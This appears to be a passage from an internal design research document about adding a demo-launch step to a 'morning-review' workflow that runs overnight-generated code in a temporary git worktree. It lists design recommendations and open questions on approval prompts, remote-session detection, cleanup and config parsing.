- **Make acceptance explicit about code execution.** "This will execute overnight-generated code from `overnight/{session_id}` using `<demo-command>`. Proceed? [yes/no]"
- **Detect remote-only invocation** (`$SSH_CONNECTION`, `$MOSH_*`) and skip the demo step entirely with a printed note, rather than offering a path the user can't use.
- **Cleanup via garbage sweep, not live tracking.** At the start of Step 0, remove any `$TMPDIR/demo-*` worktrees whose session IDs are not in the current active overnight state.
- **Spec must pin parser rules** for `demo-command` reading from `lifecycle.config.md` — explicit pseudocode for the # comment stripping rules, not English in the prompt.
- **Validate the Godot example** before shipping. Strike `--play` from the ticket / discovery research / spec. Use `godot res://main.tscn` instead.

## Open Questions

These are spec-level decisions or research-level uncertainties that the user must resolve before the spec phase can produce a precise implementation contract. Each has been investigated where investigation could resolve it; remaining items require explicit user input.

1. **Top-level shape: morning-review subsection vs. standalone `/demo` skill (Approach E vs. Approach F).** The adversarial review and tradeoffs analysis converge on F (standalone skill) as the cleanest fit, but the ticket as written is scoped to morning-review modification. **This is the central architectural question for the spec phase** and changes the file list, the testing surface, and the interaction model.
2. **Smart-assessment layer: keep, drop, or relocate.** The ticket's value pitch ("the agent reasons about demoability") depends on it. The adversarial review calls it "false precision." If dropped, the feature reduces to a thin "create worktree + print demo command" utility — does that still earn its place?
3. **Per-repo vs. per-feature `demo-command`.** The ticket places it at repo-level in `lifecycle.config.md`. The discovery research flagged this as open ("for games, individual features might demo at different scenes"). Codebase analysis suggests a per-feature override would require schema and parser work the v1 spec is unlikely to take on.
4. **Cleanup contract for the demo process and worktree.** Approaches that have the agent own the process (C) need PID/Popen plumbing the ticket disclaims. Approaches that don't (D, E, F) cannot reliably detect "still running" at Step 6. Spec needs to decide whether cleanup is automatic (garbage sweep on next invocation), manual (printed instructions), or absent.
5. **Worktree path precise convention.** `$TMPDIR/demo-{session_id}/` is sandbox-safe but per-bootstrap-session and symlink-chain on macOS. Should the path be salted with a timestamp, resolved via `realpath`, or moved to a different location entirely (`lifecycle/sessions/{id}/demo-worktree/` is sandbox-allowed but nests git state in the main repo).
6. **Branch-deleted fallback.** What happens when `/morning-review` (or `/demo`) runs and `overnight/{session_id}` no longer exists (manual deletion, PR merged + branch pruned, `git gc`)? Skip silently? Offer a main-branch worktree? Surface an error?
7. **Insertion point in the walkthrough.** Discovery research recommends "before Step 3 batch verification question." Ticket says "after displaying what was built" in Step 3. The placement decision is not surface-level — it determines whether the demo offer can stall the auto-advance contract.
8. **`lifecycle.config.md` parser precision.** Inline-instruction "read the file and check `demo-command:`" is established for simpler fields. For a shell command containing `#`, quoted args, and env vars, the inline pattern produces inconsistent parsing across invocations. Spec must either pin parser rules precisely or reuse a Python helper (which doesn't exist as a reusable module today).
9. **Security framing of the approval prompt.** Should accepting the demo offer require an explicit acknowledgment that overnight-generated code is about to execute? Or is the existing implicit trust boundary (sandbox + permission allows + manual confirmation per call) sufficient?
10. **Remote-session incompatibility.** When `/morning-review` runs over mosh on a phone, the demo step is fundamentally incompatible. Should the skill detect remote and skip the offer? Print instructions only? Refuse?
11. **Wrong Godot example throughout the ticket and discovery research.** `godot --play res://main.tscn` is probably not a valid Godot 4 flag. The corrected canonical form is `godot res://main.tscn`. **This must be fixed at the source** (backlog item, discovery research, this research doc, eventual spec) before shipping.
12. **Strategic-review framing tension.** project.md says morning review is "strategic review, not debugging sessions." Launching an interactive game or dashboard mid-review is debugging-adjacent. Does the user accept this as a tolerable tension, prefer to keep the framing pure (favoring Approach F), or want to make the trade explicitly?
